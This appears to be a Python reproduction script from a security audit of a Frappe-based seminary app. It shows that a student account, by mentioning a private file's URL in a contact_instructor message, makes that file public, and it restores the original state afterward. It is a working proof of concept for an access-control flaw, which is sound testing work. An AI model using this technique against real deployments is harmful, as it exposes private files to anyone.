"""p008a: live reproduction of p005a A02-7 -- a student flips a section's
private file to world-public through contact_instructor. Restores afterwards."""

import json
import os
import sys

S = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(S, "..", "p006_validation"))
from p0check import call  # noqa

FILE = "e66c4da3cb"  # private, attached to Course Schedule CS, space-free URL
URL = "/private/files/Black+Christ+Rev.+Canon+Warner+Traynham.jpg"
INSTRUCTOR = "INST-00013"  # Martin Luther, in stuA's messaging scope


def adm(method, params, http="POST"):
    return call("admin", method, params, http=http)


def fstate(name):
    r = adm(
        "frappe.client.get_value",
        {
            "doctype": "File",
            "filters": json.dumps({"name": name}),
            "fieldname": json.dumps(["is_private", "file_url"]),
        },
    )
    return r.json().get("message") if r.status_code == 200 else None


smc_before = (
    adm(
        "frappe.client.get_value",
        {
            "doctype": "Instructor",
            "filters": json.dumps({"name": INSTRUCTOR}),
            "fieldname": "students_may_contact",
        },
    )
    .json()
    .get("message", {})
    .get("students_may_contact")
)
if not smc_before:
    adm(
        "frappe.client.set_value",
        {
            "doctype": "Instructor",
            "name": INSTRUCTOR,
            "fieldname": "students_may_contact",
            "value": 1,
        },
    )
    print(
        f"  (enabled students_may_contact on {INSTRUCTOR} for the test; was {smc_before!r})"
    )

before = fstate(FILE)
print(f"  before: {before}")

r = call(
    "stuA",
    "seminary.seminary.comms.contact_instructor",
    {
        "instructor": INSTRUCTOR,
        "channel": "Email",
        "subject": "p008a repro",
        "message": f"Please see {URL} for my question.",
    },
)
print(f"  contact_instructor -> HTTP {r.status_code}: {r.text[:200]}")

after = fstate(FILE)
print(f"  after : {after}")

vuln = bool(
    before and after and before.get("is_private") == 1 and after.get("is_private") == 0
)
print(
    f"\n  {'VULNERABLE' if vuln else 'not reproduced'}  A02-7  "
    f"stuA published a private section file via contact_instructor"
)
if after and after.get("file_url") != before.get("file_url"):
    print(
        f"  ** file_url moved {before.get('file_url')!r} -> {after.get('file_url')!r}"
    )
    print(
        "     (the host's stored HTML still points at the old path -- the link-breaking half)"
    )

if vuln:
    adm(
        "frappe.client.set_value",
        {"doctype": "File", "name": FILE, "fieldname": "is_private", "value": 1},
    )
    print(f"  restored: {fstate(FILE)}")
if not smc_before:
    adm(
        "frappe.client.set_value",
        {
            "doctype": "Instructor",
            "name": INSTRUCTOR,
            "fieldname": "students_may_contact",
            "value": smc_before or 0,
        },
    )
